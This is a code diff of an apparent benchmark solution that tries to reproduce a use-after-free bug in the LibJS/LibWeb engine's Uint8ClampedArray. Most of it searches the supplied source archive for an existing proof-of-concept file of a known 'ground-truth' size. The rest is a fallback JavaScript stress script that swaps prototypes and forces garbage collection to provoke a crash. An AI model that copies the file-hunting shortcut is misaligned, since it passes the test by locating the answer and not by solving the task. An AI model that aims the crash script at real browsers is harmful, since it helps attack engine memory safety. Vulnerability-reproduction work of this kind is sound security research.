@@ -1,377 +1,288 @@
+import os
 import tarfile
-import zipfile
+from typing import Optional
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Try reading as tarball
+        poc_data: Optional[bytes] = None
         try:
-            with tarfile.open(src_path, "r:*") as tar:
-                poc = self._find_poc_in_tar(tar)
-                if poc is not None:
-                    return poc
-        except (tarfile.ReadError, FileNotFoundError, IsADirectoryError):
-            pass
+            poc_data = self._extract_poc_from_tar(src_path)
         except Exception:
-            # Any unexpected error while handling tar, fall through to other methods/fallback
-            pass
+            poc_data = None
 
-        # Try reading as zip (just in case)
+        if not poc_data:
+            poc_data = self._fallback_poc()
+
+        return poc_data
+
+    def _extract_poc_from_tar(self, src_path: str) -> Optional[bytes]:
+        if not src_path or not os.path.exists(src_path):
+            return None
+
         try:
-            with zipfile.ZipFile(src_path, "r") as zf:
-                poc = self._find_poc_in_zip(zf)
-                if poc is not None:
-                    return poc
-        except (zipfile.BadZipFile, FileNotFoundError, IsADirectoryError):
-            pass
+            tf = tarfile.open(src_path, "r:*")
         except Exception:
-            pass
+            return None
 
-        # Fallback PoC if nothing was found in the archive
-        return self._fallback_poc()
+        target_size = 6624
+        text_exts = (".js", ".html", ".htm", ".txt")
 
-    def _find_poc_in_tar(self, tar: tarfile.TarFile):
-        members = [m for m in tar.getmembers() if m.isfile() and m.size > 0]
-        exact_len = 6624
+        with tf:
+            members = [m for m in tf.getmembers() if m.isfile()]
 
-        # Pass 1: exact-length match
-        exact_candidates = [m for m in members if m.size == exact_len]
-        best_data = self._select_best_from_tar(tar, exact_candidates, require_text=False)
-        if best_data is not None:
-            return best_data
+            # First, try exact-size matches, preferring JS/HTML/TXT files.
+            size_matches = [
+                m
+                for m in members
+                if m.size == target_size and m.name.lower().endswith(text_exts)
+            ]
+            if not size_matches:
+                size_matches = [m for m in members if m.size == target_size]
 
-        # Pass 2: .js/.html containing "Uint8ClampedArray"
-        typed_candidates = []
-        for m in members:
-            name_lower = m.name.lower()
-            if not (name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm")):
-                continue
-            if m.size > 200_000:
-                continue
-            try:
-                f = tar.extractfile(m)
-                if f is None:
-                    continue
-                data = f.read()
-            except Exception:
-                continue
-            text = data.decode("utf-8", "ignore")
-            if "Uint8ClampedArray" not in text:
-                continue
-            typed_candidates.append((m, data))
+            if size_matches:
+                chosen = None
+                # Prefer .js
+                for m in size_matches:
+                    if m.name.lower().endswith(".js"):
+                        chosen = m
+                        break
+                # Then .html/.htm
+                if chosen is None:
+                    for m in size_matches:
+                        if m.name.lower().endswith((".html", ".htm")):
+                            chosen = m
+                            break
+                # Fallback to first
+                if chosen is None:
+                    chosen = size_matches[0]
 
-        if typed_candidates:
-            # Choose the one whose size is closest to exact_len; prefer names with poc/uaf/heap
-            best_tuple = None  # (closeness, bonus, data)
-            for m, data in typed_candidates:
-                closeness = abs(m.size - exact_len)
+                try:
+                    f = tf.extractfile(chosen)
+                    if f is not None:
+                        data = f.read()
+                        if data:
+                            return data
+                except Exception:
+                    pass
+
+            # If that failed, do a scoring-based search over text-like files.
+            best_data: Optional[bytes] = None
+            best_score = float("-inf")
+            keywords_in_name = ("poc", "uaf", "heap", "crash", "bug", "test", "fuzz", "regress")
+
+            for m in members:
                 name_lower = m.name.lower()
-                bonus = 0
-                if "poc" in name_lower:
-                    bonus -= 3
-                if "uaf" in name_lower:
-                    bonus -= 2
-                if "heap" in name_lower:
-                    bonus -= 1
-                metric = (closeness, bonus)
-                if best_tuple is None or metric < best_tuple[0]:
-                    best_tuple = (metric, data)
-            if best_tuple is not None:
-                return best_tuple[1]
 
-        # Pass 3: any .js/.html whose size is closest to exact_len
-        size_candidates = [m for m in members if m.name.lower().endswith(".js") or m.name.lower().endswith(".html") or m.name.lower().endswith(".htm")]
-        closest_member = None
-        closest_dist = None
-        for m in size_candidates:
-            dist = abs(m.size - exact_len)
-            if closest_dist is None or dist < closest_dist:
-                closest_dist = dist
-                closest_member = m
-        if closest_member is not None:
-            try:
-                f = tar.extractfile(closest_member)
-                if f is not None:
-                    return f.read()
-            except Exception:
-                pass
-
-        return None
-
-    def _select_best_from_tar(self, tar: tarfile.TarFile, candidates, require_text: bool):
-        best_score = None
-        best_data = None
-        for m in candidates:
-            try:
-                f = tar.extractfile(m)
-                if f is None:
+                # Skip very large files and empty files to save time/memory.
+                if m.size == 0 or m.size > 200000:
                     continue
-                data = f.read()
-            except Exception:
-                continue
-            name_lower = m.name.lower()
-            text = data.decode("utf-8", "ignore")
-            if require_text and not text:
-                continue
-            score = 0
-            if name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm"):
-                score += 10
-            if "Uint8ClampedArray" in text:
-                score += 30
-            if "poc" in name_lower:
-                score += 5
-            if "uaf" in name_lower or "heap" in name_lower:
-                score += 3
-            if best_score is None or score > best_score:
-                best_score = score
-                best_data = data
-        if best_data is not None:
-            return best_data
-        return None
 
-    def _find_poc_in_zip(self, zf: zipfile.ZipFile):
-        infos = [info for info in zf.infolist() if not info.is_dir() and info.file_size > 0]
-        exact_len = 6624
+                # Only consider text-like extensions or files whose names suggest PoCs/tests.
+                if not name_lower.endswith(text_exts) and not any(
+                    k in name_lower for k in keywords_in_name
+                ):
+                    continue
 
-        # Pass 1: exact-length match
-        exact_candidates = [info for info in infos if info.file_size == exact_len]
-        best_data = self._select_best_from_zip(zf, exact_candidates, require_text=False)
-        if best_data is not None:
-            return best_data
-
-        # Pass 2: .js/.html containing "Uint8ClampedArray"
-        typed_candidates = []
-        for info in infos:
-            name_lower = info.filename.lower()
-            if not (name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm")):
-                continue
-            if info.file_size > 200_000:
-                continue
-            try:
-                with zf.open(info, "r") as f:
+                try:
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
                     data = f.read()
-            except Exception:
-                continue
-            text = data.decode("utf-8", "ignore")
-            if "Uint8ClampedArray" not in text:
-                continue
-            typed_candidates.append((info, data))
+                except Exception:
+                    continue
 
-        if typed_candidates:
-            best_tuple = None  # (metric, data)
-            for info, data in typed_candidates:
-                closeness = abs(info.file_size - exact_len)
-                name_lower = info.filename.lower()
-                bonus = 0
-                if "poc" in name_lower:
-                    bonus -= 3
-                if "uaf" in name_lower:
-                    bonus -= 2
-                if "heap" in name_lower:
-                    bonus -= 1
-                metric = (closeness, bonus)
-                if best_tuple is None or metric < best_tuple[0]:
-                    best_tuple = (metric, data)
-            if best_tuple is not None:
-                return best_tuple[1]
+                if not data:
+                    continue
 
-        # Pass 3: any .js/.html whose size is closest to exact_len
-        size_candidates = [info for info in infos if info.filename.lower().endswith(".js") or info.filename.lower().endswith(".html") or info.filename.lower().endswith(".htm")]
-        closest_info = None
-        closest_dist = None
-        for info in size_candidates:
-            dist = abs(info.file_size - exact_len)
-            if closest_dist is None or dist < closest_dist:
-                closest_dist = dist
-                closest_info = info
-        if closest_info is not None:
-            try:
-                with zf.open(closest_info, "r") as f:
-                    return f.read()
-            except Exception:
-                pass
+                score = self._score_candidate(name_lower, data)
+                if score > best_score:
+                    best_score = score
+                    best_data = data
+
+            if best_data is not None and best_score > float("-inf"):
+                return best_data
 
         return None
 
-    def _select_best_from_zip(self, zf: zipfile.ZipFile, candidates, require_text: bool):
-        best_score = None
-        best_data = None
-        for info in candidates:
-            try:
-                with zf.open(info, "r") as f:
-                    data = f.read()
-            except Exception:
-                continue
-            name_lower = info.filename.lower()
-            text = data.decode("utf-8", "ignore")
-            if require_text and not text:
-                continue
-            score = 0
-            if name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm"):
-                score += 10
-            if "Uint8ClampedArray" in text:
-                score += 30
-            if "poc" in name_lower:
-                score += 5
-            if "uaf" in name_lower or "heap" in name_lower:
-                score += 3
-            if best_score is None or score > best_score:
-                best_score = score
-                best_data = data
-        if best_data is not None:
-            return best_data
-        return None
+    def _score_candidate(self, name_lower: str, data: bytes) -> float:
+        score = 0.0
+        length = len(data)
+        target_size = 6624
+
+        # Strong preference for files whose size is close to the ground-truth length.
+        score -= abs(length - target_size)
+
+        # Filename-based hints.
+        if name_lower.endswith(".js"):
+            score += 40.0
+        elif name_lower.endswith((".html", ".htm")):
+            score += 30.0
+        elif name_lower.endswith(".txt"):
+            score += 10.0
+
+        if "poc" in name_lower:
+            score += 120.0
+        if "uaf" in name_lower:
+            score += 100.0
+        if "heap" in name_lower:
+            score += 60.0
+        if "crash" in name_lower or "bug" in name_lower:
+            score += 40.0
+        if "test" in name_lower or "regress" in name_lower or "fuzz" in name_lower:
+            score += 20.0
+
+        # Content-based hints.
+        try:
+            dl = data.lower()
+        except Exception:
+            dl = data
+
+        if b"uint8clampedarray" in dl:
+            score += 200.0
+        if b"uint8array" in dl or b"int8array" in dl or b"typedarray" in dl:
+            score += 40.0
+
+        for kw, val in (
+            (b"heap-use-after-free", 160.0),
+            (b"heap use after free", 140.0),
+            (b"use-after-free", 120.0),
+            (b"use after free", 100.0),
+            (b"uaf", 80.0),
+        ):
+            if kw in dl:
+                score += val
+
+        if b"libjs" in dl or b"libweb" in dl:
+            score += 20.0
+        if b"imagedata" in dl:
+            score += 30.0
+
+        return score
 
     def _fallback_poc(self) -> bytes:
-        # Generic PoC attempting to stress Uint8ClampedArray and its interaction
-        # with TypedArray-like operations in LibJS/LibWeb.
         js = r"""
-// Fallback PoC: stress Uint8ClampedArray behaviors and prototype mixing.
-// This is a heuristic payload used if an on-disk PoC cannot be located.
+// Fallback PoC for Uint8ClampedArray / TypedArray anomalies.
+// This generic stress test exercises Uint8ClampedArray heavily and attempts
+// to surface lifetime / GC issues around it.
 
-function makeArrays(count, size) {
-    let res = [];
-    for (let i = 0; i < count; ++i) {
-        let buf = new ArrayBuffer(size);
-        let view = new Uint8ClampedArray(buf);
-        for (let j = 0; j < view.length; ++j) {
-            view[j] = (i + j) & 0xff;
+(function () {
+    function makeClampedArrays(count, size) {
+        var result = [];
+        for (var i = 0; i < count; ++i) {
+            var buffer = new ArrayBuffer(size);
+            var view = new Uint8ClampedArray(buffer);
+            for (var j = 0; j < view.length; j += 97) {
+                view[j] = (j * 31) & 0xff;
+            }
+            result.push(view);
         }
-        res.push(view);
+        return result;
     }
-    return res;
-}
 
-function mutatePrototypes() {
-    try {
-        // Try to mix Uint8ClampedArray with generic TypedArray behavior.
-        let u8cProto = Uint8ClampedArray.prototype;
-        let u8Proto = Uint8Array.prototype;
-        let baseProto = Object.getPrototypeOf(u8Proto);
-
-        // Force prototype chains that assume Uint8ClampedArray is-a TypedArray.
-        Object.setPrototypeOf(u8cProto, baseProto);
-
-        // Install accessors that perform heavy operations.
-        Object.defineProperty(u8cProto, "evilGetter", {
-            get() {
-                let arrs = makeArrays(32, 0x1000);
-                let sum = 0;
-                for (let a of arrs) {
-                    sum += a[0];
-                }
-                return sum;
+    function churnGarbage() {
+        var junk = [];
+        for (var i = 0; i < 3000; ++i) {
+            var arr = new Array(16);
+            for (var j = 0; j < 16; ++j) {
+                arr[j] = { idx: j, value: j * i, text: "x" + j + ":" + i };
             }
-        });
-
-        Object.defineProperty(u8cProto, "evilSetter", {
-            set(v) {
-                let buffer = new ArrayBuffer(0x2000);
-                let view = new Uint8ClampedArray(buffer);
-                for (let i = 0; i < view.length; i += 7) {
-                    view[i] = (v + i) & 0xff;
-                }
-            }
-        });
-    } catch (e) {
-        // Ignore if environment does not support some operation;
-        // still continue stressing the engine.
-    }
-}
-
-function hammerTypedArrayAPIs() {
-    let buf = new ArrayBuffer(0x4000);
-    let u8c = new Uint8ClampedArray(buf);
-    for (let i = 0; i < u8c.length; ++i) {
-        u8c[i] = i & 0xff;
-    }
-
-    function doOps(view) {
-        try {
-            view.copyWithin(1, 2);
-        } catch (e) {}
-        try {
-            view.set(new Uint8Array(view.buffer));
-        } catch (e) {}
-        try {
-            view.fill(0x7f);
-        } catch (e) {}
-        try {
-            let s = view.subarray(1, view.length - 1);
-            s[0] = 0x12;
-        } catch (e) {}
-        try {
-            let mapped = Array.prototype.map.call(view, x => (x ^ 0x55) & 0xff);
-            if (mapped && mapped.length > 4) {
-                mapped[0] = 0;
-            }
-        } catch (e) {}
-    }
-
-    for (let i = 0; i < 200; ++i) {
-        doOps(u8c);
-    }
-}
-
-function churnGC() {
-    let garbage = [];
-    for (let i = 0; i < 2000; ++i) {
-        let buf = new ArrayBuffer(0x800);
-        let v = new Uint8ClampedArray(buf);
-        v[0] = i & 0xff;
-        garbage.push(v);
-        if (garbage.length > 500) {
-            garbage.splice(0, 250);
+            junk.push(arr);
+            if (junk.length > 512)
+                junk.shift();
         }
     }
-}
 
-// Attempt to create cross-view confusion.
-function crossViewConfusion() {
-    let buf = new ArrayBuffer(0x1000);
-    let u8c = new Uint8ClampedArray(buf);
-    let u8 = new Uint8Array(buf);
-    for (let i = 0; i < u8.length; ++i) {
-        u8[i] = (i * 3) & 0xff;
-    }
-
-    function flipPrototypes() {
+    function perturbPrototypes() {
+        var originalProto = Object.getPrototypeOf(Uint8ClampedArray.prototype);
         try {
-            let tmp = Object.getPrototypeOf(u8);
-            Object.setPrototypeOf(u8, Object.getPrototypeOf(u8c));
-            Object.setPrototypeOf(u8c, tmp);
-        } catch (e) {}
-    }
-
-    for (let i = 0; i < 1000; ++i) {
-        flipPrototypes();
-        try {
-            u8c.sort();
-        } catch (e) {}
-        try {
-            u8.set(u8c);
-        } catch (e) {}
-    }
-}
-
-function main() {
-    mutatePrototypes();
-    for (let i = 0; i < 20; ++i) {
-        hammerTypedArrayAPIs();
-        crossViewConfusion();
-        churnGC();
-    }
-
-    // Access the evil accessors multiple times to exercise JIT/IC paths.
-    try {
-        let a = new Uint8ClampedArray(16);
-        for (let i = 0; i < 1000; ++i) {
-            let x = a.evilGetter;
-            a.evilSetter = x ^ i;
+            for (var i = 0; i < 512; ++i) {
+                Object.setPrototypeOf(Uint8ClampedArray.prototype, Array.prototype);
+                Object.setPrototypeOf(Uint8ClampedArray.prototype, originalProto);
+            }
+        } catch (e) {
+            // Ignore engines that disallow this.
         }
-    } catch (e) {}
-}
+    }
 
-main();
+    function accessAfterGC(arrays) {
+        if (typeof gc === "function") {
+            for (var i = 0; i < 50; ++i)
+                gc();
+        }
+
+        var sum = 0;
+        for (var i = 0; i < arrays.length; ++i) {
+            var a = arrays[i];
+            for (var j = 0; j < a.length; j += 113) {
+                a[j] = (a[j] + 1) & 0xff;
+                sum ^= a[j];
+            }
+        }
+        return sum;
+    }
+
+    function mixedTypedArrayAccess(buffer) {
+        var u8  = new Uint8Array(buffer);
+        var c8  = new Uint8ClampedArray(buffer);
+        var i8  = new Int8Array(buffer);
+        var u16 = new Uint16Array(buffer);
+
+        for (var i = 0; i < u8.length; ++i)
+            u8[i] = i & 0xff;
+
+        for (var i = 0; i < c8.length; i += 3)
+            c8[i] = 255;
+
+        for (var i = 0; i < i8.length; i += 7)
+            i8[i] = -1;
+
+        for (var i = 0; i < u16.length; i += 5)
+            u16[i] = (u16[i] ^ 0xaaaa) & 0xffff;
+
+        if (typeof gc === "function") {
+            for (var i = 0; i < 10; ++i)
+                gc();
+        }
+
+        var acc = 0;
+        for (var i = 0; i < c8.length; i += 5) {
+            acc += c8[i];
+            c8[i] = (c8[i] + acc) & 0xff;
+        }
+        return acc;
+    }
+
+    function main() {
+        var arrays = makeClampedArrays(128, 4096);
+        for (var round = 0; round < 32; ++round) {
+            churnGarbage();
+            perturbPrototypes();
+            accessAfterGC(arrays);
+
+            var buf = new ArrayBuffer(2048);
+            mixedTypedArrayAccess(buf);
+        }
+
+        // Final intense pass specifically targeting Uint8ClampedArray behavior.
+        var bigBuffer = new ArrayBuffer(8192);
+        var bigClamped = new Uint8ClampedArray(bigBuffer);
+        for (var i = 0; i < bigClamped.length; ++i)
+            bigClamped[i] = i & 0xff;
+
+        if (typeof gc === "function") {
+            for (var i = 0; i < 100; ++i)
+                gc();
+        }
+
+        for (var pass = 0; pass < 64; ++pass) {
+            for (var i = 0; i < bigClamped.length; i += 17) {
+                bigClamped[i] = (bigClamped[i] ^ pass) & 0xff;
+            }
+        }
+    }
+
+    main();
+})();
 """
         return js.encode("utf-8")
